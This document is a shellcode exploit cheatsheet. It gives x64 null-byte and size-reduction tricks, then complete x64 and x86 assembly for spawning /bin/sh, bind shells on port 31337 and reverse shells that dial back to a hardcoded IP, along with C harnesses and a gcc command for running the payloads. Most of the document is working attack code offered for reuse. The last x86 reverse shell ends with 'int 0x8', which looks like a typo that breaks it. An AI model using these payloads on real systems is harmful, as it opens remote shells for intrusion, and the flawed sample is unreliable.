# Exploit-Cheatsheet

## Shellcode

### `x64`

#### Common techniques

* prevent null byte
    * Use existing values from registers/stack
        * e.g. if initially `rdi` is already 0, `xor rdi, rdi` becomes redundant
    * `xor rax, rax`: zero out `rax`, no null byte opcode
    * `mov rax, 0x30` → `push 0x30; pop rax`
    * `push 0x697a0002` → `push word 0x697a; push word 0x2`
* shorter opcode:
    * `cdq` (1 byte): zero out `rdx` if `rax >= 0`
    * `imul esi` (2 bytes): zero out `rdx` if `rsi == 0`
    * `push 0x30; pop rax` (3 bytes) → `mov al, 0x30`
    * `add eax, 1` (3 bytes), `inc rax` (3 bytes) → `inc eax` (2 bytes), `add al, 1` (2 bytes)
    * `xchg` (2 bytes)
* Caveats
    * if `eax == 0x000000ff`, then after `add al, 1`, `eax == 0x00000000`
        * use `inc ax`, `inc eax`, `inc rax` instead if you want `eax == 0x00000100`
    * `mov [m64], imm64` is not possible
        * e.g., `mov [rax], 0x68732f2f6e69622f` is not possible
        * Change to `mov rbx, 0x68732f2f6e69622f; mov [rax], rbx`

#### Example

* `execve("/bin/sh", NULL, NULL)` (Null Free, 22 Bytes)

```
xor esi, esi
push rsi
mov rbx, 0x68732f2f6e69622f
push rbx
push rsp
pop rdi
imul esi
mov al, 0x3b
syscall
```

* Bind shell

```
; s = socket(2, 1, 0)
push 0x29
pop rax
cdq
push 0x2
pop rdi
push 0x1
pop rsi
syscall

; bind(s, [2, port, 0], 16)
xchg rax, rdi
mov al, 0x31
push rdx
push word 0x697a ; 31337
push word 0x2
push rsp
pop rsi
mov dl, 0x10
syscall

; listen(s, 0)
mov al, 0x32
xor esi, esi
syscall

; c = accept(s, 0, 0)
mov al, 0x2b
cdq
syscall

; dup2(c, {2,1,0});
xchg rax, rdi
mov esi, edi
loop:
mov al, 0x21
syscall
dec esi
jns loop

; execve("/bin/sh", 0, 0)
xor esi, esi
push rsi
mov rbx, 0x68732f2f6e69622f
push rbx
push rsp
pop rdi
cdq
mov al, 0x3b
syscall
```

* Reverse shell

```
; s = socket(2, 1, 0)
push 0x29
pop rax
cdq
push 0x2
pop rdi
push 0x1
pop rsi
syscall

; connect(s, [2, port, ip], 16)
xchg rax, rdi
push 0x101017f ; ip
push word 0x697a ; port
push word 0x2
push rsp
pop rsi
mov dl, 0x10
mov al, 0x2a
syscall

; dup2(s, {2,1,0});
mov esi, edi
loop:
mov al, 0x21
syscall
dec esi
jns loop

; execve("/bin/sh", 0, 0)
xor esi, esi
push rsi
mov rbx,0x68732f2f6e69622f
push rbx
push rsp
pop rdi
cdq
mov al, 0x3b
syscall
```

### `x86`

* `execve("/bin/sh", NULL, NULL)`

```
xor eax, eax
xor ecx, ecx
cdq
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor al, 0xb
int 0x80
```

* Bind Shell

```
push 0x66
pop eax
push 0x1
pop ebx
xor esi, esi
push esi
push ebx
push 0x2
mov ecx, esp
int 0x80

pop edi
xchg edi, eax
xchg ebx, eax
mov al, 0x66
push esi
push 0x697a ; port 31337
push bx
mov ecx, esp
push 0x10
push ecx
push edi
mov ecx, esp
int 0x80

mov al, 0x66
mov bl, 0x4
push esi
push edi
mov ecx, esp
int 0x80
mov al, 0x66
inc ebx
push esi
push esi
push edi
mov ecx, esp
int 0x80

pop ecx
pop ecx
mov cl, 0x2
xchg ebx, eax
loop:
mov al, 0x3f
int 0x80

dec ecx
jns loop
mov al, 0xb
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
inc ecx
mov edx, ecx
int 0x80
```

* Reverse Shell

```
push 0x66
pop eax
cdq
xor ebx, ebx
inc ebx
push edx
push ebx
push 0x2
mov ecx, esp
int 0x80

pop ecx
xchg eax, ebx
loop:
mov al, 0x3f
int 0x80

dec ecx
jns loop
mov al, 0x66
push 0x101017f
push word 0x672b
push 0x2
mov ecx, esp
push 0x10
push ecx
push ebx
mov ecx, esp
int 0x80

mov al, 0xb
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
int 0x8
```

#### Shellcode Testing
* From string
Source (`sc.c`)
```c
int main() {
    char shellcode[] = ""; // shellcode
    int (*run)() = (int(*)())shellcode;
    run();
}
```
* From file
```c
#include <stdio.h>
#include <stdlib.h>
#define SHELLCODE_LENGTH 4096
int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "usage: ./shellcode_test [BINARY FILE]");
        exit(EXIT_FAILURE);
    }
    char shellcode[SHELLCODE_LENGTH]; // shellcode
    FILE *fp = fopen(argv[1], "rb");
    if (fp == NULL) {
        fprintf(stderr, "Cannot open file %s\n", argv[1]);
        exit(EXIT_FAILURE);
    }
    fread(shellcode, SHELLCODE_LENGTH, 1, fp);
    if (ferror(fp)) {
        fprintf(stderr, "Cannot read file %s\n", argv[1]);
        exit(EXIT_FAILURE);
    }
    int (*run)() = (int(*)())shellcode;
    run();
}
```
* Compile
```bash
gcc sc.c -z execstack -o sc
```
